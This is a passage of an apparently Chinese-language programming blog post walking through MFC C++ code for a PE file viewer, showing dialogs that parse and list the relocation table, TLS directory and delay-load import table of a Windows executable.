class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化重定位表列表框，并获取文件基址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRecationTabDlg::ShowReTab</span><span class="params">(PIMAGE_DATA_DIRECTORY pReLocaTionDir,<span class="keyword">char</span>* Filebuff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_FilePath = Filebuff;</span><br><span class="line">m_pReLocaTionDir = pReLocaTionDir;</span><br><span class="line"><span class="comment">//初始化列表框LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES</span></span><br><span class="line">m_objQuDuan.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);<span class="comment">//更改风格</span></span><br><span class="line">m_objKuai.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);<span class="comment">//更改风格</span></span><br><span class="line"><span class="comment">// 添加列</span></span><br><span class="line">m_objQuDuan.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;Index&quot;</span>, <span class="number">0</span>, <span class="number">50</span>);</span><br><span class="line">m_objQuDuan.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;Section&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuan.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;RVA&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuan.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;Item&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">m_objKuai.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;Index&quot;</span>, <span class="number">0</span>, <span class="number">50</span>);</span><br><span class="line">m_objKuai.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;RVA&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objKuai.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;Offset&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objKuai.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;Type&quot;</span>, <span class="number">0</span>, <span class="number">50</span>);</span><br><span class="line">m_objKuai.InsertColumn(<span class="number">4</span>, <span class="string">L&quot;Far Address&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objKuai.InsertColumn(<span class="number">5</span>, <span class="string">L&quot;Data Interpretation&quot;</span>, <span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line">EnumRecationTabQuduan();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="区段"><a href="#区段" class="headerlink" title="区段"></a>区段</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//显示重定位表 区段</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRecationTabDlg::EnumRecationTabQuduan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_FilePath;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + m_FilePath);</span><br><span class="line"><span class="comment">//Nt头下一个头文件就是区段头</span></span><br><span class="line">PIMAGE_SECTION_HEADER pQuHead = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"><span class="comment">//扩展头是nt头的第三个数据</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//文件头是nt头的第二个数据</span></span><br><span class="line">PIMAGE_FILE_HEADER pFileHead = (PIMAGE_FILE_HEADER)&amp;pNt-&gt;FileHeader;</span><br><span class="line"><span class="comment">//重定位表是扩展头最后一个数据字段（目录表）中的下表为5的字段数据</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pDataDir = (PIMAGE_BASE_RELOCATION)&amp;pOption-&gt;DataDirectory[<span class="number">5</span>];</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//PIMAGE_BASE_RELOCATION pReloc =</span></span><br><span class="line"><span class="comment">//(PIMAGE_BASE_RELOCATION)</span></span><br><span class="line"><span class="comment">//(RvaToFoa(m_FilePath, pDataDir-&gt;VirtualAddress) + m_FilePath);</span></span><br><span class="line"></span><br><span class="line">DWORD dwBeginRva = <span class="number">0x10000</span>;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="comment">//文件头的NumberOfSections字段表示区段头的数量</span></span><br><span class="line"><span class="keyword">int</span> nNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pQuHead[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pQuHead[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pQuHead[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwBeginRva &lt; dwSectionRva)</span><br><span class="line">&#123;</span><br><span class="line">dwBeginRva = dwSectionRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (dwBeginRva &gt;= dwSectionRva &amp;&amp; dwBeginRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="comment">//序号</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%d&quot;</span>, nNum);</span><br><span class="line">m_objQuDuan.InsertItem(nNum, cs);</span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%S&quot;</span>, pQuHead[i].Name);</span><br><span class="line">m_objQuDuan.SetItemText(nNum, <span class="number">1</span>, cs);</span><br><span class="line"><span class="comment">//RVA</span></span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, dwBeginRva);</span><br><span class="line">m_objQuDuan.SetItemText(nNum, <span class="number">2</span>, cs);</span><br><span class="line"><span class="comment">//Item</span></span><br><span class="line">DWORD dwCount = ((pDataDir-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>);</span><br><span class="line">cs.Format(<span class="string">L&quot;%04x&quot;</span>, dwCount);</span><br><span class="line">m_objQuDuan.SetItemText(nNum, <span class="number">3</span>, cs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_vecRva.push_back(dwBeginRva);</span><br><span class="line">dwBeginRva += <span class="number">0x1000</span>;</span><br><span class="line">nNum++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="块"><a href="#块" class="headerlink" title="块"></a>块</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//显示重定位表 块项目</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRecationTabDlg::EnumRecationTabKuai</span><span class="params">(DWORD dwRVA,DWORD dwClistItem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_objKuai.DeleteAllItems();</span><br><span class="line"><span class="keyword">int</span> Const = <span class="number">0</span>;</span><br><span class="line">CString Temp;</span><br><span class="line"><span class="comment">//重定位表</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(RvaToFoa(m_FilePath, m_pReLocaTionDir-&gt;VirtualAddress) + m_FilePath);</span><br><span class="line"><span class="comment">//3. 开始解析重定位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line"><span class="comment">//Dos头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_FilePath;</span><br><span class="line"><span class="comment">//Nt头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + m_FilePath);</span><br><span class="line"><span class="comment">//区段头</span></span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"><span class="comment">//扩展头</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果重定位表有数据（SizeOfBlock这个字段表示重定位表的结构大小）</span></span><br><span class="line"><span class="keyword">while</span> (pReloc-&gt;SizeOfBlock != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到描述每一个位置偏移的数组</span></span><br><span class="line"><span class="comment">//重定位表+1表示第一个数据</span></span><br><span class="line">TYPEOFFSET* typeoffset = (TYPEOFFSET*)(pReloc + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//重定位结构体大小减去8后除以2就等于重定位地址的数量</span></span><br><span class="line">DWORD dwCount = (pReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">DWORD dwBeginRva = pReloc-&gt;VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pReloc-&gt;SizeOfBlock != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//得到描述每一个位置偏移的数组</span></span><br><span class="line">TYPEOFFSET* typeoffset = (TYPEOFFSET*)(pReloc + <span class="number">1</span>);</span><br><span class="line">DWORD dwCount = (pReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">DWORD dwBeginRva = pReloc-&gt;VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dwBeginRva *= dwClistItem + 1;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (typeoffset[i].TYPE == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRelocRva = (dwRVA + typeoffset[i].OFFSET);</span><br><span class="line"><span class="keyword">if</span> (m_vecRva.size() &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dwRelocRva &gt;= m_vecRva[dwClistItem] &amp;&amp; dwRelocRva &lt; m_vecRva[dwClistItem + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//序号</span></span><br><span class="line">Temp.Format(<span class="string">L&quot;%d&quot;</span>, i);</span><br><span class="line">m_objKuai.InsertItem(i, Temp);</span><br><span class="line"><span class="comment">//RVA</span></span><br><span class="line">Temp.Format(<span class="string">L&quot;%08x&quot;</span>, dwRelocRva);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">1</span>, Temp);</span><br><span class="line"><span class="comment">//printf(&quot;要重定位的位置RVA：%p\n&quot;, dwRelocRva);</span></span><br><span class="line"><span class="comment">//RVA对应的数据</span></span><br><span class="line"><span class="comment">//类型</span></span><br><span class="line">Temp.Format(<span class="string">L&quot;%02x&quot;</span>, typeoffset[i].TYPE);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">3</span>, Temp);</span><br><span class="line"></span><br><span class="line">PDWORD offset = (PDWORD)RvaToFoa(m_FilePath, dwRelocRva);</span><br><span class="line">Temp.Format(<span class="string">L&quot;%08x&quot;</span>, offset);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">2</span>, Temp);</span><br><span class="line">PDWORD pRelocData = (PDWORD)(RvaToFoa(m_FilePath, dwRelocRva) + m_FilePath);</span><br><span class="line">Temp.Format(<span class="string">L&quot;%08x&quot;</span>, pRelocData);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">4</span>, Temp);</span><br><span class="line"><span class="comment">//printf(&quot;要重定位的数据：%p\n&quot;, *pRelocData);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* pRec = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)</span><br><span class="line">(RvaToFoa(m_FilePath, *pRelocData) + m_FilePath);</span><br><span class="line">Temp = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> m = <span class="number">0</span>; m &lt; <span class="number">20</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line">Temp += pRec[m];</span><br><span class="line">&#125;</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">5</span>, Temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Temp.Format(<span class="string">L&quot;%d&quot;</span>, i);</span><br><span class="line">m_objKuai.InsertItem(i, Temp);</span><br><span class="line"><span class="comment">//RVA</span></span><br><span class="line">Temp.Format(<span class="string">L&quot;%08x&quot;</span>, dwRelocRva);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">1</span>, Temp);</span><br><span class="line"><span class="comment">//printf(&quot;要重定位的位置RVA：%p\n&quot;, dwRelocRva);</span></span><br><span class="line"><span class="comment">//RVA对应的数据</span></span><br><span class="line"><span class="comment">//类型</span></span><br><span class="line">Temp.Format(<span class="string">L&quot;%02x&quot;</span>, typeoffset[i].TYPE);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">3</span>, Temp);</span><br><span class="line"></span><br><span class="line">PDWORD offset = (PDWORD)RvaToFoa(m_FilePath, dwRelocRva);</span><br><span class="line">Temp.Format(<span class="string">L&quot;%08x&quot;</span>, offset);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">2</span>, Temp);</span><br><span class="line">PDWORD pRelocData = (PDWORD)(RvaToFoa(m_FilePath, dwRelocRva) + m_FilePath);</span><br><span class="line">Temp.Format(<span class="string">L&quot;%08x&quot;</span>, pRelocData);</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">4</span>, Temp);</span><br><span class="line"><span class="comment">//printf(&quot;要重定位的数据：%p\n&quot;, *pRelocData);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* pRec = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)</span><br><span class="line">(RvaToFoa(m_FilePath, *pRelocData) + m_FilePath);</span><br><span class="line">Temp = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> m = <span class="number">0</span>; m &lt; <span class="number">20</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line">Temp += pRec[m];</span><br><span class="line">&#125;</span><br><span class="line">m_objKuai.SetItemText(i, <span class="number">5</span>, Temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="点击区段响应块"><a href="#点击区段响应块" class="headerlink" title="点击区段响应块"></a>点击区段响应块</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//点击区段列表响应</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRecationTabDlg::OnClickList1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"></span><br><span class="line">m_objKuai.DeleteAllItems();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CString RVA =  m_objQuDuan.GetItemText(pNMItemActivate-&gt;iItem, <span class="number">2</span>);</span><br><span class="line"> DWORD dwVa = _tcstoul(RVA, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"> EnumRecationTabKuai(dwVa, pNMItemActivate-&gt;iItem);</span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TLS表"><a href="#TLS表" class="headerlink" title="TLS表"></a>TLS表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TLS表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDirTabDlg::OnBnClickedButton12</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyTlsTabDlg* pTlsTab = <span class="keyword">new</span> CMyTlsTabDlg;</span><br><span class="line">pTlsTab-&gt;Create(IDD_TLSTAB,<span class="keyword">this</span>);</span><br><span class="line">pTlsTab-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">pTlsTab-&gt;GetInfo(m_pTlsTab,m_Filebuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TLS表的输出"><a href="#TLS表的输出" class="headerlink" title="TLS表的输出"></a>TLS表的输出</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTlsTabDlg::GetInfo</span><span class="params">(PIMAGE_DATA_DIRECTORY m_pTlsTab, <span class="keyword">char</span>* m_Filebuff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwLtsFOA = RvaToFoa(m_pTlsTab-&gt;VirtualAddress, m_Filebuff);</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 pTls = (PIMAGE_TLS_DIRECTORY32)(dwLtsFOA + m_Filebuff);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pTls-&gt;StartAddressOfRawData);</span><br><span class="line">m_strEdit1.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pTls-&gt;EndAddressOfRawData);</span><br><span class="line">m_strEdit2.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pTls-&gt;AddressOfIndex);</span><br><span class="line">m_strEdit3.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pTls-&gt;AddressOfCallBacks);</span><br><span class="line">m_strEdit4.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pTls-&gt;SizeOfZeroFill);</span><br><span class="line">m_strEdit5.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pTls-&gt;Characteristics);</span><br><span class="line">m_strEdit6.SetString(cs);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="延迟输入表"><a href="#延迟输入表" class="headerlink" title="延迟输入表"></a>延迟输入表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//延迟输入表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDirTabDlg::OnBnClickedButton16</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_dwYanchiSize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;延迟表为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CMyUnloadTabDlg* pUnloadTab = <span class="keyword">new</span> CMyUnloadTabDlg;</span><br><span class="line">pUnloadTab-&gt;Create(IDD_DECSRIPTORTAB, <span class="keyword">this</span>);</span><br><span class="line">pUnloadTab-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">pUnloadTab-&gt;GetUnloadTabInfo(m_pUnloadTab, m_Filebuff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="延迟输入表的输出"><a href="#延迟输入表的输出" class="headerlink" title="延迟输入表的输出"></a>延迟输入表的输出</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyUnloadTabDlg::GetUnloadTabInfo</span><span class="params">(PIMAGE_DATA_DIRECTORY m_pUnloadTab, <span class="keyword">char</span>* m_Filebuff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD pUnloadFov = RvaToFoa((DWORD)(m_pUnloadTab-&gt;VirtualAddress), m_Filebuff);</span><br><span class="line">PIMAGE_DELAYLOAD_DESCRIPTOR pUnload = (PIMAGE_DELAYLOAD_DESCRIPTOR)(pUnloadFov + m_Filebuff);</span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pUnload-&gt;DllNameRVA);</span><br><span class="line">m_strEdit1.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pUnload-&gt;ModuleHandleRVA);</span><br><span class="line">m_strEdit2.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pUnload-&gt;ImportAddressTableRVA);</span><br><span class="line">m_strEdit3.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pUnload-&gt;ImportNameTableRVA);</span><br><span class="line">m_strEdit4.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pUnload-&gt;BoundImportAddressTableRVA);</span><br><span class="line">m_strEdit5.SetString(cs);</span><br><span class="line">cs.Format(<span class="string">L&quot;%08x&quot;</span>, pUnload-&gt;UnloadInformationTableRVA);</span><br><span class="line">m_strEdit6.SetString(cs);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区段表"><a href="#区段表" class="headerlink" title="区段表"></a>区段表</h2><h3 id="初始化-4"><a href="#初始化-4" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化区段表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyQuDuanDlg::InitQuDuanTable</span><span class="params">(<span class="keyword">char</span>* buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_objQuDuanList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);<span class="comment">//更改风格</span></span><br><span class="line"><span class="comment">// 添加列</span></span><br><span class="line">m_objQuDuanList.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;名称&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuanList.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;相对偏移&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuanList.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;区段大小&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuanList.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;文件偏移&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuanList.InsertColumn(<span class="number">4</span>, <span class="string">L&quot;区段文件大小&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objQuDuanList.InsertColumn(<span class="number">5</span>, <span class="string">L&quot;标志&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">AnalyzeQuDuan(buff);</span><br><span 